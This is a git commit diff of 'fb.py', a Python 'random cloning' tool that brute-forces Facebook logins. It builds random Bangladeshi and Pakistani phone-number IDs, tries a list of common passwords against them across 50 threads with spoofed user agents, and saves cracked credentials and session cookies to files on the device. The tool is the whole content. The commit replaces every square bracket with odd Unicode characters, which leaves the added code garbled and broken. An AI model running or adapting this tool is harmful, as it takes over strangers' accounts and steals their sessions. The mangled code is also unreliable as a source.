55fb8b60dc9145ebdce4fe2f384232ebbd9c2f0a
mdtasin123 <129798134+mdtasin123@users.noreply.github.com>
2023-05-19 10:54:09 +0530

    Add files via upload

--- fb.py
+++ fb.py
@@ -9,12 +9,12 @@ def o():
     os.system('clear')
     print(logo)
     ip = requests.get("https://api.ipify.org").text
-    print("\33[m\033[1;91m\033[1;41m\033[1;97m-------------------------------------------\033[;0m\033[1;91m\033[1;92m")
-    jalan("\033[1;33m[\033[1;33m] \033[92;1mIP ADDRES \033[38;5;196m: \33[m\033[1;91m\033[38;5;46m\033[38;5;46m"+ip)
-    print("\33[m\033[1;91m\033[1;41m\033[1;97m-------------------------------------------\033[;0m\033[1;91m\033[1;92m")
-    jalan("\033[97;1m[\033[92;1m1\033[97;1m] \033[92;1mSTART RANDOM CLONING   ")
-    print("\033[97;1m[\033[92;1m2\033[97;1m] \033[92;1mJOIN MY GROUP ")
-    Riyad = input('\033[97;1m[\033[92;1m?\033[97;1m] \033[92;1mSelect menu \033[38;5;196m: ')
+    print("\33〔᚛m\033〔᚛1;91m\033〔᚛1;41m\033〔᚛1;97m-------------------------------------------\033〔᚛;0m\033〔᚛1;91m\033〔᚛1;92m")
+    jalan("\033〔᚛1;33m〔᚛\033〔᚛1;33m᚜〕 \033〔᚛92;1mIP ADDRES \033〔᚛38;5;196m: \33〔᚛m\033〔᚛1;91m\033〔᚛38;5;46m\033〔᚛38;5;46m"+ip)
+    print("\33〔᚛m\033〔᚛1;91m\033〔᚛1;41m\033〔᚛1;97m-------------------------------------------\033〔᚛;0m\033〔᚛1;91m\033〔᚛1;92m")
+    jalan("\033〔᚛97;1m〔᚛\033〔᚛92;1m1\033〔᚛97;1m᚜〕 \033〔᚛92;1mSTART RANDOM CLONING   ")
+    print("\033〔᚛97;1m〔᚛\033〔᚛92;1m2\033〔᚛97;1m᚜〕 \033〔᚛92;1mJOIN MY GROUP ")
+    Riyad = input('\033〔᚛97;1m〔᚛\033〔᚛92;1m?\033〔᚛97;1m᚜〕 \033〔᚛92;1mSelect menu \033〔᚛38;5;196m: ')
     if Riyad == '1':
         i()
     if Riyad == '2':
@@ -62,36 +62,36 @@ def back():
 Riyad="Riyad"
 imt="Riyad"
 ak="CLASS3-"
-myid=uuid.uuid4().hex[:8].upper()
+myid=uuid.uuid4().hex〔᚛:8᚜〕.upper()
 
             
-RED = '\033[38;5;196m'
-WHITE = '\033[1;97m'
-GREEN = '\033[1;32m' #
-YELLOW = '\033[1;33m'
-BLUE = '\033[1;34m'
-ORANGE = '\033[1;35m'
-P = '\x1b[1;97m' # PUTIH
-M = '\x1b[1;91m' # MERAH
-H = '\x1b[1;92m' # HIJAU
-K = '\x1b[1;93m' # KUNING
-B = '\x1b[1;94m' # BIRU
-U = '\x1b[1;95m' # UNGU
-O = '\x1b[1;96m' # BIRU MUDA
-N = '\x1b[0m'    # WARNA MATI
-A = '\x1b[1;90m' # WARNA ABU ABU
-BN = '\x1b[1;107m' # BELAKANG PUTIH
-BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
-BP = '\x1b[1;105m' # BELAKANG PINK
-BB = '\x1b[1;104m' # BELAKANG BIRU
-BK = '\x1b[1;103m' # BELAKANG KUNING
-BH = '\x1b[1;102m' # BELAKANG HIJAU
-BM = '\x1b[1;101m' # BELAJANG MERAH
-BA = '\x1b[1;100m' # BELAKANG ABU ABU
-my_color = [
- P, M, H, K, B, U, O, N]
+RED = '\033〔᚛38;5;196m'
+WHITE = '\033〔᚛1;97m'
+GREEN = '\033〔᚛1;32m' #
+YELLOW = '\033〔᚛1;33m'
+BLUE = '\033〔᚛1;34m'
+ORANGE = '\033〔᚛1;35m'
+P = '\x1b〔᚛1;97m' # PUTIH
+M = '\x1b〔᚛1;91m' # MERAH
+H = '\x1b〔᚛1;92m' # HIJAU
+K = '\x1b〔᚛1;93m' # KUNING
+B = '\x1b〔᚛1;94m' # BIRU
+U = '\x1b〔᚛1;95m' # UNGU
+O = '\x1b〔᚛1;96m' # BIRU MUDA
+N = '\x1b〔᚛0m'    # WARNA MATI
+A = '\x1b〔᚛1;90m' # WARNA ABU ABU
+BN = '\x1b〔᚛1;107m' # BELAKANG PUTIH
+BBL = '\x1b〔᚛1;106m' # BELAKANG BIRU LANGIT
+BP = '\x1b〔᚛1;105m' # BELAKANG PINK
+BB = '\x1b〔᚛1;104m' # BELAKANG BIRU
+BK = '\x1b〔᚛1;103m' # BELAKANG KUNING
+BH = '\x1b〔᚛1;102m' # BELAKANG HIJAU
+BM = '\x1b〔᚛1;101m' # BELAJANG MERAH
+BA = '\x1b〔᚛1;100m' # BELAKANG ABU ABU
+my_color = 〔᚛
+ P, M, H, K, B, U, O, N᚜〕
 warna = random.choice(my_color)
-bi = random.choice([M,N,K,B,U])
+bi = random.choice(〔᚛M,N,K,B,U᚜〕)
 now = datetime.now()
 dt_string = now.strftime("%H:%M")
 current = datetime.now()
@@ -99,24 +99,24 @@ ta = current.year
 bu = current.month
 ha = current.day
 today = date.today()
-logo=("""\033[1;97m
+logo=("""\033〔᚛1;97m
   ██████╗ ███████╗    ██████╗     ██╗  ██╗
 ██╔════╝ ██╔════╝    ╚════██╗    ╚██╗██╔╝
 ██║  ███╗███████╗     █████╔╝     ╚███╔╝ 
 ██║   ██║╚════██║    ██╔═══╝      ██╔██╗ 
 ╚██████╔╝███████║    ███████╗    ██╔╝ ██╗
  ╚═════╝ ╚══════╝    ╚══════╝    ╚═╝  ╚═╝
-\033[1;92m╔═════════════════════════════════════════╗
-\033[1;92m║ ᗙ  Owner    : MD RIYAD                  ║
-\033[1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
-\033[1;92m║ ᗙ  Version  : 0.1                       ║
-\033[1;92m║ ᗙ  Team     : GS POWER                  ║ 
-\033[1;92m╚═════════════════════════════════════════╝""")
+\033〔᚛1;92m╔═════════════════════════════════════════╗
+\033〔᚛1;92m║ ᗙ  Owner    : MD RIYAD                  ║
+\033〔᚛1;92m║ ᗙ  Facebook : MD.RIYAD                  ║
+\033〔᚛1;92m║ ᗙ  Version  : 0.1                       ║
+\033〔᚛1;92m║ ᗙ  Team     : GS POWER                  ║ 
+\033〔᚛1;92m╚═════════════════════════════════════════╝""")
 try:
-    print("\033[38;5;46m\nTOOL UPDATE SUCCESSFUL\n")
+    print("\033〔᚛38;5;46m\nTOOL UPDATE SUCCESSFUL\n")
     time.sleep(2)
     Riyad()
-    print("\033[38;5;196m\nYOUR DEVICE IS NOT SUPPORTED!\n")
+    print("\033〔᚛38;5;196m\nYOUR DEVICE IS NOT SUPPORTED!\n")
     Riyad()
     v = 5.2
     update = ('5.2')
@@ -124,19 +124,19 @@ try:
     if str(v) in update:
         os.system('clear')
     else:pass
-except:print('\n\033[1;31mPROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN\033[0;92m')
+except:print('\n\033〔᚛1;31mPROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN\033〔᚛0;92m')
 
 
 loop = 0
-oks = []
-cps = []
+oks = 〔᚛᚜〕
+cps = 〔᚛᚜〕
  
 def clear():
     os.system('clear')
     print(logo)
 from time import localtime as lt
 from os import system as cmd
-ltx = int(lt()[3])
+ltx = int(lt()〔᚛3᚜〕)
 if ltx > 12:
     a = ltx-12
     tag = "PM"
@@ -146,7 +146,7 @@ else:
     
     
 try:
-    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
+    print('\n\n\033〔᚛1;33mLoading asset files ... \033〔᚛0;97m')
     v = 5.2
     update = ('5.2')
     update = ('5.2')
@@ -154,25 +154,25 @@ try:
         os.system('clear')
         os.system("espeak \"Wall come sir, BD RANDOM TOOLS  loading  PLEASE WAIT \"")
     else:pass
-except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
+except:print('\n\033〔᚛1;31mNo internet connection ... \033〔᚛0;97m')
 #global functions
 def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
+    titik = 〔᚛'.   ','..  ','... ','.... '᚜〕
     for o in titik:
         print('\r'+text+o),
         sys.stdout.flush();time.sleep(1)
 
 #User agents
-ugen2=[]
-ugen=[]
+ugen2=〔᚛᚜〕
+ugen=〔᚛᚜〕
 
 for xd in range(98605):
     aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20'])
+    b=random.choice(〔᚛'3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20'᚜〕)
     c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    d=random.choice(〔᚛'A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'᚜〕)
     e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    f=random.choice(〔᚛'A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'᚜〕)
     g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
     h=random.randrange(73,100)
     i='0'
@@ -183,28 +183,28 @@ for xd in range(98605):
     ugen.append(uaku2)
 
 def i():
-    user=[]
-    twf =[]
+    user=〔᚛᚜〕
+    twf =〔᚛᚜〕
     os.getuid
     os.geteuid
     os.system("clear")
     print(logo)
-    print('\033[38;5;46--------------------------------------------')
-    print('\x1b[1;93mBANGLADESH & PAKISTAN RANDOM NUMBER CLONED')
-    print('\033[38;5;46--------------------------------------------')
-    print('\033[97;1mᗙ \033[92;1m\033[97;1m\033[38;5;46mPK CODE    \033[38;5;196m:\x1b[1;95m 92301 92302 92303 92305 ')
-    print('\033[38;5;46--------------------------------------------')
-    print('\033[97;1mᗙ \033[92;1m\033[97;1m\033[38;5;46mBD CODE    \033[38;5;196m:\x1b[1;95m 88016 88017 88018 88019 ')
-    print('\033[38;5;46--------------------------------------------')
-    code = input('\033[38;5;196mINPUT CODE \033[1;97m: ')
+    print('\033〔᚛38;5;46--------------------------------------------')
+    print('\x1b〔᚛1;93mBANGLADESH & PAKISTAN RANDOM NUMBER CLONED')
+    print('\033〔᚛38;5;46--------------------------------------------')
+    print('\033〔᚛97;1mᗙ \033〔᚛92;1m\033〔᚛97;1m\033〔᚛38;5;46mPK CODE    \033〔᚛38;5;196m:\x1b〔᚛1;95m 92301 92302 92303 92305 ')
+    print('\033〔᚛38;5;46--------------------------------------------')
+    print('\033〔᚛97;1mᗙ \033〔᚛92;1m\033〔᚛97;1m\033〔᚛38;5;46mBD CODE    \033〔᚛38;5;196m:\x1b〔᚛1;95m 88016 88017 88018 88019 ')
+    print('\033〔᚛38;5;46--------------------------------------------')
+    code = input('\033〔᚛38;5;196mINPUT CODE \033〔᚛1;97m: ')
     print("")
     os.system('clear')
     print(logo)
-    print("           \033[1;97m[\033[1;33mMR-GSXD-404-CYBER\033[1;97m]")
-    print("\033[38;5;46--------------------------------------------")
-    print("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mEXAMPLE      \033[38;5;196m: \033[1;35m10000\033[1;97m , \033[1;34m20000\033[1;97m , \033[1;32m30000")
-    print("\033[38;5;46--------------------------------------------")
-    limit = int(input("\033[97;1m[\033[92;1m?\033[97;1m] \033[1;97mCRACK ID LIMIT \033[38;5;196m: \033[1;32m"))
+    print("           \033〔᚛1;97m〔᚛\033〔᚛1;33mMR-GSXD-404-CYBER\033〔᚛1;97m᚜〕")
+    print("\033〔᚛38;5;46--------------------------------------------")
+    print("\033〔᚛97;1m〔᚛\033〔᚛92;1mᗙ\033〔᚛97;1m᚜〕 \033〔᚛1;97mEXAMPLE      \033〔᚛38;5;196m: \033〔᚛1;35m10000\033〔᚛1;97m , \033〔᚛1;34m20000\033〔᚛1;97m , \033〔᚛1;32m30000")
+    print("\033〔᚛38;5;46--------------------------------------------")
+    limit = int(input("\033〔᚛97;1m〔᚛\033〔᚛92;1m?\033〔᚛97;1m᚜〕 \033〔᚛1;97mCRACK ID LIMIT \033〔᚛38;5;196m: \033〔᚛1;32m"))
     
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(8))
@@ -212,14 +212,14 @@ def i():
     with ThreadPool(max_workers=50) as Riyad:
         clear()
         tl = str(len(user))
-        jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mAGENTS    \033[38;5;196m: \033[1;32m'+str(len(ugen)))
-        jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mSIM CODE  \033[38;5;196m: \033[1;32m'+code)
-        jalan('\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[92;1mCRACK ID  \033[38;5;196m: \033[1;32m'+tl)
-        print('\033[38;5;46--------------------------------------------')
-        jalan("\033[97;1m[\033[92;1mᗙ\033[97;1m] \033[1;97mFIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE")
-        print('\033[38;5;46--------------------------------------------')
+        jalan('\033〔᚛97;1m〔᚛\033〔᚛92;1mᗙ\033〔᚛97;1m᚜〕 \033〔᚛92;1mAGENTS    \033〔᚛38;5;196m: \033〔᚛1;32m'+str(len(ugen)))
+        jalan('\033〔᚛97;1m〔᚛\033〔᚛92;1mᗙ\033〔᚛97;1m᚜〕 \033〔᚛92;1mSIM CODE  \033〔᚛38;5;196m: \033〔᚛1;32m'+code)
+        jalan('\033〔᚛97;1m〔᚛\033〔᚛92;1mᗙ\033〔᚛97;1m᚜〕 \033〔᚛92;1mCRACK ID  \033〔᚛38;5;196m: \033〔᚛1;32m'+tl)
+        print('\033〔᚛38;5;46--------------------------------------------')
+        jalan("\033〔᚛97;1m〔᚛\033〔᚛92;1mᗙ\033〔᚛97;1m᚜〕 \033〔᚛1;97mFIRST \033〔᚛1;34m〔᚛\033〔᚛1;32mON\033〔᚛1;97m/\033〔᚛38;5;196mOFF\033〔᚛1;34m᚜〕 \033〔᚛1;97mAIRPLANE MODE")
+        print('\033〔᚛38;5;46--------------------------------------------')
         for love in user:
-            pwx = [love,'bangladesh','i love you','696969','57273200','123321','121234','889900','708090','0987654',Bangladesh' ]
+            pwx = 〔᚛love,'bangladesh','i love you','696969','57273200','123321','121234','889900','708090','0987654',Bangladesh' ᚜〕
             uid = code+love
             Riyad.submit(rcrack,uid,pwx,tl)
     print('\n    CRACK PROCESS HAS BEEN COMPLETED ')
@@ -263,23 +263,23 @@ def rcrack(uid,pwx,tl):
             lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[65:80]
-                print('\033[38;5;46m[GS XD-OK[] ' +uid+ '|' +ps+    '  \n   \033[1;33mCOOKIES[💉] : \033[38;5;46m'+coki+ ' ')                
+                coki=";".join(〔᚛key+"="+value for key,value in session.cookies.get_dict().items()᚜〕)
+                cid = coki〔᚛65:80᚜〕
+                print('\033〔᚛38;5;46m〔᚛GS XD-OK〔᚛᚜〕 ' +uid+ '|' +ps+    '  \n   \033〔᚛1;33mCOOKIES〔᚛💉᚜〕 : \033〔᚛38;5;46m'+coki+ ' ')                
                 open('/sdcard/GS XD-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[65:80]
-                print('\033[38;5;196m[GS XD-CP[] ' +uid+ '|' +ps+ '  \33[0;97m')
+                coki=";".join(〔᚛key+"="+value for key,value in session.cookies.get_dict().items()᚜〕)
+                cid = coki〔᚛65:80᚜〕
+                print('\033〔᚛38;5;196m〔᚛GS XD-CP〔᚛᚜〕 ' +uid+ '|' +ps+ '  \33〔᚛0;97m')
                 open('/sdcard/GS XD-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r\33[1;93m[\33[m-GS XD-OK\033[0m/%s\33[1;93m]\033[1;97mOK-\033[38;5;46m%s'%(loop,len(oks))),
+        sys.stdout.write('\r\33〔᚛1;93m〔᚛\33〔᚛m-GS XD-OK\033〔᚛0m/%s\33〔᚛1;93m᚜〕\033〔᚛1;97mOK-\033〔᚛38;5;46m%s'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
